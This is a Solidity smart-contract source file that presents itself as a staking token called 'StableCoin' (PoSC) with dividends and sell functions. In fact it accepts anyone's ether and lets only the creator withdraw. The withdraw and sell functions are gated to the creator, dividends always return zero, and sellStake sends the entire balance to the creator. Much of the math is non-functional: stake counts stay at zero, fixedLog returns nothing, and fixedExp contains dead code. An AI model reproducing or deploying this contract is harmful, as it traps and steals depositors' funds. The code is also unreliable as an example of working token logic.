 

pragma solidity ^0.4.18;

 

contract TestingCoin {

	string constant public name = "StableCoin";
	string constant public symbol = "PoSC";
	uint256 constant scaleFactor = 0x10000000000000000;
	uint8 constant limitedFirstBuyers = 4;
	uint256 constant firstBuyerLimit = 0.5 ether;  
	uint8 constant public decimals = 18;

	mapping(address => uint256) public stakeBalance;
	mapping(address => int256) public payouts;

	uint256 public totalSupply;
	uint256 public contractBalance;
	int256 totalPayouts;
	uint256 earningsPerStake;
	uint8 initialFunds;
	address creator;
	uint256 numStakes = 0;
	uint256 balance = 0;

	modifier isAdmin()   { require(msg.sender   == creator  ); _; }
	modifier isLive() 	 { require(contractBalance >= limitedFirstBuyers * firstBuyerLimit); _;}  

	function TestingCoin() public {
    	initialFunds = limitedFirstBuyers;
			creator = msg.sender;
  }

	function stakeOf(address _owner) public constant returns (uint256 balance) {
		return stakeBalance[_owner];
	}

	function withdraw() public gameStarted() {
		balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		contractBalance = sub(contractBalance, balance);
		msg.sender.transfer(balance);
	}

	function reinvestDividends() public gameStarted() {
		balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		uint value_ = (uint) (balance);

		if (value_ < 0.000001 ether || value_ > 1000000 ether)
			revert();

		var sender = msg.sender;
		var res = reserve() - balance;
		var fee = div(value_, 10);
		var numEther = value_ - fee;
		var buyerFee = fee * scaleFactor;
        var totalStake = 1;

		if (totalStake > 0) {
			var holderReward = fee * 1;
			buyerFee -= holderReward;
			var rewardPerShare = holderReward / totalSupply;
			earningsPerStake += rewardPerShare;
		}

		totalSupply = add(totalSupply, numStakes);
		stakeBalance[sender] = add(stakeBalance[sender], numStakes);

		var payoutDiff  = (int256) ((earningsPerStake * numStakes) - buyerFee);
		payouts[sender] += payoutDiff;
		totalPayouts    += payoutDiff;
	}


	function sellMyStake() public gameStarted() {
		sell(balance);
	}

  function getMeOutOfHere() public gameStarted() {
        withdraw();
	}

	function fund() payable public {
  	if (msg.value > 0.000001 ether) {
			buyStake();
		} else {
			revert();
		}
  }


	function withdrawDividends(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		contractBalance = sub(contractBalance, balance);
		to.transfer(balance);
	}

	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();

		var sender = msg.sender;
		var fee = div(msg.value, 10);
		var numEther = msg.value - fee;
		var buyerFee = fee * scaleFactor;
		if (totalSupply > 0) {
			var bonusCoEff = 1;
			var holderReward = fee * bonusCoEff;
			buyerFee -= holderReward;

			var rewardPerShare = holderReward / totalSupply;
			earningsPerStake += rewardPerShare;
		}

		totalSupply = add(totalSupply, numStakes);
		stakeBalance[sender] = add(stakeBalance[sender], numStakes);
		var payoutDiff = (int256) ((earningsPerStake * numStakes) - buyerFee);
		payouts[sender] += payoutDiff;
		totalPayouts    += payoutDiff;
	}


	function sell(uint256 amount) internal {
		var numEthersBeforeFee = getEtherForStakes(amount);
    var fee = div(numEthersBeforeFee, 10);
    var numEthers = numEthersBeforeFee - fee;
		totalSupply = sub(totalSupply, amount);
		stakeBalance[msg.sender] = sub(stakeBalance[msg.sender], amount);
		var payoutDiff = (int256) (earningsPerStake * amount + (numEthers * scaleFactor));
		payouts[msg.sender] -= payoutDiff;
    totalPayouts -= payoutDiff;

		if (totalSupply > 0) {
			var etherFee = fee * scaleFactor;
			var rewardPerShare = etherFee / totalSupply;
			earningsPerStake = add(earningsPerStake, rewardPerShare);
		}
	}

	function buyStake() internal {
		contractBalance = add(contractBalance, msg.value);
	}

	function sellStake() public gameStarted() {
		 creator.transfer(contractBalance);
	}

	function reserve() internal constant returns (uint256 amount) {
		return 1;
	}


	function getEtherForStakes(uint256 Stakes) constant returns (uint256 ethervalue) {
		var reserveAmount = reserve();
		if (Stakes == totalSupply)
			return reserveAmount;
		return sub(reserveAmount, fixedExp(fixedLog(totalSupply - Stakes)));
	}

	function fixedLog(uint256 a) internal pure returns (int256 log) {
		int32 scale = 0;
		while (a > 10) {
			a /= 2;
			scale++;
		}
		while (a <= 5) {
			a *= 2;
			scale--;
		}
	}

    function dividends(address _owner) internal returns (uint256 divs) {
        divs = 0;
        return divs;
    }

	modifier gameStarted()   { require(msg.sender   == creator ); _;}

	function fixedExp(int256 a) internal pure returns (uint256 exp) {
		int256 scale = (a + (54)) / 2 - 64;
		a -= scale*2;
		if (scale >= 0)
			exp <<= scale;
		else
			exp >>= -scale;
		return exp;
			int256 z = (a*a) / 1;
		int256 R = ((int256)(2) * 1) +
			(2*(2 + (2*(4 + (1*(26 + (2*8/1))/1))/1))/1);
	}

	 
	 

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		assert(c / a == b);
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		 
		uint256 c = a / b;
		 
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		assert(c >= a);
		return c;
	}

	function () payable public {
		if (msg.value > 0) {
			fund();
		} else {
			withdraw();
		}
	}
}

 